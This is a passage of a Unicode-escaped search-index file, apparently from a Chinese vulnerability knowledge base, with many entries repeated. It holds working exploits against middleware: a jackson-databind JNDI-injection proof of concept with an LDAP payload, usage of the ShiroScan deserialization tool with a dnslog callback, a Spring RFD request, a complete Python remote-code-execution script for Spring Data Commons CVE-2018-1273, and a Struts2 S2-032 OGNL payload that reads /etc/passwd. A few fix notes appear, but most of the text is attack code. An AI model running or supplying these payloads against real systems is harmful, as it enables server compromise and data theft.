\u9996\u5148\u5b9a\u4f4d\u5230br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\uff0c\u4e4b\u540e\u53d1\u73b0\u4e00\u5904\u53ef\u7591\u7684JNDI\u6ce8\u5165\uff1a \u7531\u4e8e\u53c2\u6570\u6765\u81eaobject\uff0c\u6240\u4ee5\u4e4b\u540e\u5168\u5c40\u641c\u7d22\u8c03\u7528getObjectOrPerformJndiLookup\u51fd\u6570\u8c03\u7528\u7684\u5730\u65b9\u53d1\u73b0setMetricRegistry\u5904\u6709\u4e00\u5904\u53ef\u63a7\u7684\u8c03\u7528\uff0c\u6b64\u5904\u7684\u53c2\u6570metricRegistry\u53ef\u6709json\u6307\u5b9a\uff0c\u4e4b\u540e\u4f20\u5165getObjectOrPerformJndiLookup\uff0c\u4e4b\u540e\u518d\u6b21\u4f20\u5165lookup\uff0c\u4ece\u800c\u5bfc\u81f4JNDI\u6ce8\u5165\u7684\u53d1\u751f\uff0c\u5e76\u6700\u7ec8\u5bfc\u81f4RCE: \u6574\u4e2a\u5229\u7528\u94fe\u5982\u4e0b\u6240\u793a\uff1a mapper.readValue ->setMetricRegistry ->getObjectOrPerformJndiLookup ->lookup \u4fee\u590d\u5efa\u8bae \u00b6 \u2022 \u53ca\u65f6\u5c06jackson-databind\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c \u2022 \u5347\u7ea7\u5230\u8f83\u9ad8\u7248\u672c\u7684JDK\u3002 \u53c2\u8003\u94fe\u63a5 https://github.com/FasterXML/jackson-databind/issues/2634","title":"jackson-databind RCE CVE-2020-9548"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_1","text":"\u2022 jackson-databind before 2.9.10.4 \u2022 jackson-databind before 2.8.11.6 \u2022 jackson-databind before 2.7.9.7","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_2","text":"JDNI\u6ce8\u5165\u5bfc\u81f4RCE \u5229\u7528\u6761\u4ef6 \u2022 \u5f00\u542fenableDefaultTyping() \u2022 \u4f7f\u7528\u4e86br.com.anteros.dbcp.AnterosDBCPConfig\u7b2c\u4e09\u65b9\u4f9d\u8d56","title":"\u6f0f\u6d1e\u7c7b\u578b"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_3","text":"2020\u5e743\u6708\uff0cjackson-databind\u5728github\u4e0a\u66f4\u65b0\u4e86\u4e00\u4e2a\u65b0\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7c7bbr.com.anteros.dbcp.AnterosDBCPConfig\uff0c\u8be5\u7c7b\u7ed5\u8fc7\u4e86\u4e4b\u524djackson-databind\u7ef4\u62a4\u7684\u9ed1\u540d\u5355\u7c7b\uff0c\u5e76\u4e14JDK\u7248\u672c\u8f83\u4f4e\u7684\u8bdd\uff0c\u53ef\u9020\u6210RCE\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_4","text":"\u73af\u5883\u642d\u5efa pom.xml\uff1a <dependencies> <dependency> <groupId>com.fasterxml.jackson.core</groupId> <artifactId>jackson-databind</artifactId> <version>2.9.9.1</version> </dependency> <!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --> <dependency> <groupId>br.com.anteros</groupId> <artifactId>Anteros-DBCP</artifactId> <version>1.0.1</version> </dependency> <dependency> <groupId>org.slf4j</groupId> <artifactId>slf4j-nop</artifactId> <version>1.7.2</version> </dependency> <!-- https://mvnrepository.com/artifact/javax.transaction/jta --> <dependency> <groupId>javax.transaction</groupId> <artifactId>jta</artifactId> <version>1.1</version> </dependency> </dependencies>","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_5","text":"\u7f16\u8bd1Exploit.java Exploit.java\u4ee3\u7801\u5982\u4e0b\uff1a import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } \u642d\u5efaHTTP\u670d\u52a1 \u4f7f\u7528Python\u642d\u5efa\u7b80\u6613SimpleHTTPServer\u670d\u52a1\uff1a \u642d\u5efaLDAP\u670d\u52a1 \u4f7f\u7528marshalsec\u6765\u542f\u52a8\u4e00\u4e2aLDAP\u670d\u52a1\uff1a \u6267\u884c\u6f0f\u6d1ePOC1 Poc.java\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } \u4e4b\u540e\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_6","text":"\u9996\u5148\u5b9a\u4f4d\u5230br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\uff0c\u4e4b\u540e\u53d1\u73b0\u4e00\u5904\u53ef\u7591\u7684JNDI\u6ce8\u5165\uff1a \u7531\u4e8e\u53c2\u6570\u6765\u81eaobject\uff0c\u6240\u4ee5\u4e4b\u540e\u5168\u5c40\u641c\u7d22\u8c03\u7528getObjectOrPerformJndiLookup\u51fd\u6570\u8c03\u7528\u7684\u5730\u65b9\u53d1\u73b0setMetricRegistry\u5904\u6709\u4e00\u5904\u53ef\u63a7\u7684\u8c03\u7528\uff0c\u6b64\u5904\u7684\u53c2\u6570metricRegistry\u53ef\u6709json\u6307\u5b9a\uff0c\u4e4b\u540e\u4f20\u5165getObjectOrPerformJndiLookup\uff0c\u4e4b\u540e\u518d\u6b21\u4f20\u5165lookup\uff0c\u4ece\u800c\u5bfc\u81f4JNDI\u6ce8\u5165\u7684\u53d1\u751f\uff0c\u5e76\u6700\u7ec8\u5bfc\u81f4RCE: \u6574\u4e2a\u5229\u7528\u94fe\u5982\u4e0b\u6240\u793a\uff1a mapper.readValue ->setMetricRegistry ->getObjectOrPerformJndiLookup ->lookup","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_7","text":"\u2022 \u53ca\u65f6\u5c06jackson-databind\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c \u2022 \u5347\u7ea7\u5230\u8f83\u9ad8\u7248\u672c\u7684JDK\u3002 \u53c2\u8003\u94fe\u63a5 https://github.com/FasterXML/jackson-databind/issues/2634","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/","text":"ShiroScan \u00b6 Shiro<=1.2.4\u53cd\u5e8f\u5217\u5316\uff0c\u4e00\u952e\u68c0\u6d4b\u5de5\u5177 \u6539\u52a8\u5185\u5bb9\uff1a1.\u65b0\u589e4\u4e2a\u5229\u7528\u94fe\u6a21\u5757(CommonsCollections7-10)\uff0c\u9884\u8ba1\u589e\u52a0\u6210\u529f\u738730%\uff0c\u5df2\u6253\u5305\u6210\u65b0ysoserial\u7684jar\u5305\uff0c\u8bf7\u52ff\u66f4\u6362 \u6539\u52a8\u5185\u5bb9\uff1a2.\u589e\u52a0\u591a\u7ebf\u7a0b\uff0c\u867d\u6a21\u5757\u589e\u52a0\u4f46\u901f\u5ea6\u5374\u63d0\u9ad8300% \u96c6\u621021\u4e2akey\u8fdb\u884cfuzz \u5982\u679c\u6709\u5e2e\u52a9\uff0c\u8bf7\u70b9\u4e2astar\u54e6\uff0c\u5bf9\u5e94blog\u6587\u7ae0\uff1a http://www.svenbeast.com/post/tskRKJIPg/ pip3 install -r requirments.txt Usage\uff1apython3 shiro.py url command Usage\uff1apython3 shiro.py https://url.com whoami http://www.dnslog.cn/ \u9a8c\u8bc1\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2adnslog\u5e73\u53f0\uff0c\u901f\u5ea6\u6bd4ceye.io\u8981\u5feb\u5f88\u591a \u6267\u884c\u7684\u547d\u4ee4\u5e26\u7a7a\u683c\u8bb0\u5f97\u7528\"\"\u5f15\u8d77\u6765 usage\uff1apython3 shiro.py http://url.com \"ping dnslog.cn\" 11\u4e2a\u6a21\u5757\u5168\u90e8\u8dd1\u4e00\u904d,\u7136\u540e\u53bbdnslog\u5e73\u53f0\u67e5\u770b\u662f\u5426\u6536\u5230\u8bf7\u6c42\uff0c\u4e0d\u51fa\u6765\u5c31GG\uff0c\u4e5f\u53ef\u80fd\u662f\u56e0\u4e3a\u7f16\u7801\u8fd8\u4e0d\u591f\u591a \u8bf7\u81ea\u884c\u6536\u96c6\u7f16\u7801\uff0c\u5728moule\u4e0b\u7684\u6e90\u4ee3\u7801\u4e2d\u81ea\u884c\u6dfb\u52a0\u65b9\u6cd5\u5373\u53ef \u4e3a\u4e86\u811a\u672c\u8fd0\u884c\u7b80\u5355\uff0c\u591a\u7ebf\u7a0b\u6570\u91cf\u4e0d\u662f\u4f7f\u7528\u8005\u4f20\u53c2\u63a7\u5236\uff0c\u9ed8\u8ba420\u7ebf\u7a0b\uff0c\u5982\u9700\u6539\u52a8\u8bf7\u5230/moule/main.py\u7b2c20\u884c\u4ee3\u7801\u81ea\u884c\u4fee\u6539\u63a7\u5236\u7ebf\u7a0b\u7684\u53c2\u6570 \u4e0d\u63a8\u8350\u5f53\u505aexp\u4f7f\u7528\uff0c\u6548\u7387\u95ee\u9898 \u00b6 \u4ec5\u4f9b\u5b89\u5168\u4eba\u5458\u9a8c\u8bc1,\u6d4b\u8bd5\u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e \u00b6","title":"ShiroScan"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/#shiroscan","text":"Shiro<=1.2.4\u53cd\u5e8f\u5217\u5316\uff0c\u4e00\u952e\u68c0\u6d4b\u5de5\u5177 \u6539\u52a8\u5185\u5bb9\uff1a1.\u65b0\u589e4\u4e2a\u5229\u7528\u94fe\u6a21\u5757(CommonsCollections7-10)\uff0c\u9884\u8ba1\u589e\u52a0\u6210\u529f\u738730%\uff0c\u5df2\u6253\u5305\u6210\u65b0ysoserial\u7684jar\u5305\uff0c\u8bf7\u52ff\u66f4\u6362 \u6539\u52a8\u5185\u5bb9\uff1a2.\u589e\u52a0\u591a\u7ebf\u7a0b\uff0c\u867d\u6a21\u5757\u589e\u52a0\u4f46\u901f\u5ea6\u5374\u63d0\u9ad8300% \u96c6\u621021\u4e2akey\u8fdb\u884cfuzz \u5982\u679c\u6709\u5e2e\u52a9\uff0c\u8bf7\u70b9\u4e2astar\u54e6\uff0c\u5bf9\u5e94blog\u6587\u7ae0\uff1a http://www.svenbeast.com/post/tskRKJIPg/ pip3 install -r requirments.txt Usage\uff1apython3 shiro.py url command Usage\uff1apython3 shiro.py https://url.com whoami http://www.dnslog.cn/ \u9a8c\u8bc1\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2adnslog\u5e73\u53f0\uff0c\u901f\u5ea6\u6bd4ceye.io\u8981\u5feb\u5f88\u591a \u6267\u884c\u7684\u547d\u4ee4\u5e26\u7a7a\u683c\u8bb0\u5f97\u7528\"\"\u5f15\u8d77\u6765 usage\uff1apython3 shiro.py http://url.com \"ping dnslog.cn\" 11\u4e2a\u6a21\u5757\u5168\u90e8\u8dd1\u4e00\u904d,\u7136\u540e\u53bbdnslog\u5e73\u53f0\u67e5\u770b\u662f\u5426\u6536\u5230\u8bf7\u6c42\uff0c\u4e0d\u51fa\u6765\u5c31GG\uff0c\u4e5f\u53ef\u80fd\u662f\u56e0\u4e3a\u7f16\u7801\u8fd8\u4e0d\u591f\u591a \u8bf7\u81ea\u884c\u6536\u96c6\u7f16\u7801\uff0c\u5728moule\u4e0b\u7684\u6e90\u4ee3\u7801\u4e2d\u81ea\u884c\u6dfb\u52a0\u65b9\u6cd5\u5373\u53ef \u4e3a\u4e86\u811a\u672c\u8fd0\u884c\u7b80\u5355\uff0c\u591a\u7ebf\u7a0b\u6570\u91cf\u4e0d\u662f\u4f7f\u7528\u8005\u4f20\u53c2\u63a7\u5236\uff0c\u9ed8\u8ba420\u7ebf\u7a0b\uff0c\u5982\u9700\u6539\u52a8\u8bf7\u5230/moule/main.py\u7b2c20\u884c\u4ee3\u7801\u81ea\u884c\u4fee\u6539\u63a7\u5236\u7ebf\u7a0b\u7684\u53c2\u6570","title":"ShiroScan"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/#exp","text":"","title":"\u4e0d\u63a8\u8350\u5f53\u505aexp\u4f7f\u7528\uff0c\u6548\u7387\u95ee\u9898"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/#_1","text":"","title":"\u4ec5\u4f9b\u5b89\u5168\u4eba\u5458\u9a8c\u8bc1,\u6d4b\u8bd5\u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4e8e\u5f53\u5730\u65f6\u95f41\u670816\u65e5\uff0c Pivotal Software\uff08Spring\u7cfb\u5217\uff09\u5b98\u65b9\u53d1\u5e03 Spring Framework \u5b58\u5728 RFD\uff08\u53cd\u5c04\u578b\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff09\u7684\u6f0f\u6d1e\u62a5\u544a\uff0c\u6b64\u6f0f\u6d1e\u4e3a\u653b\u51fb\u5ba2\u6237\u7aef\u7684\u6f0f\u6d1e\uff0c\u5b98\u65b9\u5c06\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u8bc4\u4e3a\u9ad8\u3002\u62a5\u544a\u6307\u51fa\uff0c\u5f53\u54cd\u5e94\u4e2d\u8bbe\u7f6e\u4e86\u201cContent-Disposition\u201d\u5934\u4e14filename\u5c5e\u6027\u662f\u7528\u6237\u53ef\u63a7\u65f6\u5bb9\u6613\u53d7\u5230RFD\u653b\u51fb\u3002\u653b\u51fb\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6240\u6709\u6761\u4ef6\u624d\u53ef\u6210\u529f\uff1a 1.header\u4f7f\u7528org.springframework.http.ContentDisposition\u6765\u9884\u5907 2.\u6587\u4ef6\u540d\u662f\u901a\u8fc7ContentDisposition.Builder#filename(String) \u6216 ContentDisposition.Builder#filename(String, US_ASCII)\u6765\u8bbe\u7f6e\u3002 3.\u6587\u4ef6\u540d\uff08\u5305\u62ec\u6587\u4ef6\u540d\u540e\u7f00\uff09\u4e3a\u7528\u6237\u53ef\u63a7\u3002 4.\u653b\u51fb\u8005\u5df2\u5c06\u4e0b\u8f7d\u7684\u54cd\u5e94\u5185\u5bb9\u6ce8\u5165\u6076\u610f\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u5229\u7528RFD\u6f0f\u6d1e\uff0c\u7ed3\u5408\u793e\u5de5\u7b49\u65b9\u5f0f\uff0c\u8ba9\u7528\u6237\u4e0b\u8f7d\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4ece\u800c\u5371\u5bb3\u7528\u6237\u7684\u7ec8\u7aef\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 Spring Framework 5.2.0 to 5.2.2\uff0c5.1.0 to 5.1.12\uff0c5.0.0 to 5.0.15 POC \u00b6 GET /?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 \u4fee\u590d\u5efa\u8bae \u00b6 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u81f3 Spring Framework 5.2.3\uff0c5.1.13 \u6216 5.0.16 \u7248\u672c\u3002","title":"CVE-2020-5398-Spring MVC\u7684RFD\uff08\u53cd\u5c04\u6587\u4ef6\u4e0b\u8f7d\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_1","text":"\u4e8e\u5f53\u5730\u65f6\u95f41\u670816\u65e5\uff0c Pivotal Software\uff08Spring\u7cfb\u5217\uff09\u5b98\u65b9\u53d1\u5e03 Spring Framework \u5b58\u5728 RFD\uff08\u53cd\u5c04\u578b\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff09\u7684\u6f0f\u6d1e\u62a5\u544a\uff0c\u6b64\u6f0f\u6d1e\u4e3a\u653b\u51fb\u5ba2\u6237\u7aef\u7684\u6f0f\u6d1e\uff0c\u5b98\u65b9\u5c06\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u8bc4\u4e3a\u9ad8\u3002\u62a5\u544a\u6307\u51fa\uff0c\u5f53\u54cd\u5e94\u4e2d\u8bbe\u7f6e\u4e86\u201cContent-Disposition\u201d\u5934\u4e14filename\u5c5e\u6027\u662f\u7528\u6237\u53ef\u63a7\u65f6\u5bb9\u6613\u53d7\u5230RFD\u653b\u51fb\u3002\u653b\u51fb\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6240\u6709\u6761\u4ef6\u624d\u53ef\u6210\u529f\uff1a 1.header\u4f7f\u7528org.springframework.http.ContentDisposition\u6765\u9884\u5907 2.\u6587\u4ef6\u540d\u662f\u901a\u8fc7ContentDisposition.Builder#filename(String) \u6216 ContentDisposition.Builder#filename(String, US_ASCII)\u6765\u8bbe\u7f6e\u3002 3.\u6587\u4ef6\u540d\uff08\u5305\u62ec\u6587\u4ef6\u540d\u540e\u7f00\uff09\u4e3a\u7528\u6237\u53ef\u63a7\u3002 4.\u653b\u51fb\u8005\u5df2\u5c06\u4e0b\u8f7d\u7684\u54cd\u5e94\u5185\u5bb9\u6ce8\u5165\u6076\u610f\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u5229\u7528RFD\u6f0f\u6d1e\uff0c\u7ed3\u5408\u793e\u5de5\u7b49\u65b9\u5f0f\uff0c\u8ba9\u7528\u6237\u4e0b\u8f7d\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4ece\u800c\u5371\u5bb3\u7528\u6237\u7684\u7ec8\u7aef\u5b89\u5168\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_2","text":"Spring Framework 5.2.0 to 5.2.2\uff0c5.1.0 to 5.1.12\uff0c5.0.0 to 5.0.15","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#poc","text":"GET /?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1","title":"POC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_3","text":"\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u81f3 Spring Framework 5.2.3\uff0c5.1.13 \u6216 5.0.16 \u7248\u672c\u3002","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/","text":"!/usr/bin/python3 \u00b6 - - coding:utf-8 - - \u00b6 author:zhzyker \u00b6 from: https://github.com/zhzyker/exphub \u00b6 telegram:t.me/zhzyker \u00b6 import requests import sys if len(sys.argv)!=3: print('+----------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ Spring Data Commons Remote Code Execution (No display) +') print('+----------------------------------------------------------------------------+') print('+ USE: python3 cve-2018-1273_cmd.py \" \" +') print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 \"touch /tmp/exphub\" +') print('+ VER: Spring Data Commons 1.13 to 1.13.10 +') print('+ Spring Data Commons 2.0 to 2.0.5 +') print('+----------------------------------------------------------------------------+') sys.exit() url = sys.argv[1] cmd = sys.argv[2] vuln = url + \"/users\" headers = { 'Host': \"localhost:8080\", 'Connection': \"keep-alive\", 'Content-Length': \"120\", 'Pragma': \"no-cache\", 'Cache-Control': \"no-cache\", 'Origin': \" http://localhost:8080 \", 'Upgrade-Insecure-Requests': \"1\", 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\", 'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng, / ;q=0.8\", 'Referer': \" http://localhost:8080/users?page=0&size=5 \", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\" } payload = \"username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=\" % cmd try: r = requests.post(vuln, data=payload, headers=headers) if r.status_code == 500: print (\"[+] Code executed successfully\") else: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") except: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\")","title":"Cve 2018 1273 cmd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#usrbinpython3","text":"","title":"!/usr/bin/python3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#-codingutf-8-","text":"","title":"-- coding:utf-8 --"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#authorzhzyker","text":"","title":"author:zhzyker"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#fromhttpsgithubcomzhzykerexphub","text":"","title":"from:https://github.com/zhzyker/exphub"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#telegramtmezhzyker","text":"import requests import sys if len(sys.argv)!=3: print('+----------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ Spring Data Commons Remote Code Execution (No display) +') print('+----------------------------------------------------------------------------+') print('+ USE: python3 cve-2018-1273_cmd.py \" \" +') print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 \"touch /tmp/exphub\" +') print('+ VER: Spring Data Commons 1.13 to 1.13.10 +') print('+ Spring Data Commons 2.0 to 2.0.5 +') print('+----------------------------------------------------------------------------+') sys.exit() url = sys.argv[1] cmd = sys.argv[2] vuln = url + \"/users\" headers = { 'Host': \"localhost:8080\", 'Connection': \"keep-alive\", 'Content-Length': \"120\", 'Pragma': \"no-cache\", 'Cache-Control': \"no-cache\", 'Origin': \" http://localhost:8080 \", 'Upgrade-Insecure-Requests': \"1\", 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\", 'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng, / ;q=0.8\", 'Referer': \" http://localhost:8080/users?page=0&size=5 \", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\" } payload = \"username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=\" % cmd try: r = requests.post(vuln, data=payload, headers=headers) if r.status_code == 500: print (\"[+] Code executed successfully\") else: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") except: print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\")","title":"telegram:t.me/zhzyker"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Struts 2.3.20 - Struts Struts 2.3.28\uff082.3.20.3\u548c2.3.24.3\u9664\u5916\uff09 EXP \u00b6 ?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat /etc/passwd","title":"Struts2 S2-032\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"Struts 2.3.20 - Struts Struts 